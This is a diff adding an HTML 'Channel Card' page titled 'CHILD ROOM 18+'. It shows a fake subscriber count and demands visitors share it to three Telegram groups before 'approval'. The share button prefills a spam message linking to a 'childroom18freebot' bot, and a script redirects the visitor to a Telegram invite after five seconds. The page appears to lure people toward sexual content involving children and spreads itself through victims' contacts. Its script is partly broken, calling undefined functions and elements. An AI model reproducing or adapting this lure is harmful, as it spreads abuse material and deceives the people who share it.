@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Channel Card</title>
+  <style>
+    body {
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background-color: #1e1e1e;
+      border-radius: 15px;
+      width: 300px;
+      padding: 20px;
+      text-align: center;
+      color: #fff;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+    }
+
+    .profile-pic {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 15px;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .subtitle {
+      color: #aaa;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+
+    .btn {
+      background-color: #2f89fc;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 20px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 14px;
+      text-decoration: none;
+      display: inline-block;
+    }
+    
+        .share-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        
+    }
+
+    .btn:hover {
+      background-color: #1a6fd8;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="0b3ebcd079f0f9add4cbd810dda92a8e.jpg" alt="Profile" width="80" height="80" style="border-radius: 50%;">
+    <div class="title">CHILD ROOM 18+</div>
+    <div class="subtitle">55 939 subscribers</div>
+    <div class="subtitle">𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝘀𝗵𝗮𝗿𝗲 𝗶𝗻 𝟯 𝗴𝗿𝗼𝘂𝗽𝘀 𝘁𝗼 𝗯𝗲 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱</div>
+    <button class="share-btn" id="share-btn" onclick="shareToTelegram()"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Profile" width="24px" height="24px" style="border-radius: 50%;"> 𝗦𝗛𝗔𝗥𝗘 (𝟬/𝟯)</button>
+  </div>
+    <script>
+         let shareCount = 0;
+        const shareBtn = document.getElementById("share-btn");
+        const progressBar = document.getElementById("progress");
+        const redirectUrl = ""; // Change to your desired URL
+
+        function shareToTelegram() {
+            const telegramUrl = `https://t.me/share/url?url=%20Free%20pasok%20guys%F0%9F%91%89https%3A%2F%2Ft.me%2Fchildroom18freebot%2Fjoinfree`;
+            window.open(telegramUrl, "_blank");
+            
+            shareCount++;
+            updateProgress();
+        }
+    </script>
+</body>
+</html>
+
+</script>
+<script>
+       setTimeout(function() {
+        window.location.href = "https://t.me/+5nOnTvIO429iNTc1"; // Change this to your desired URL
+    }, 5000); // 5000 milliseconds = 5 seconds
+</script>
+</body>
+</html>
+
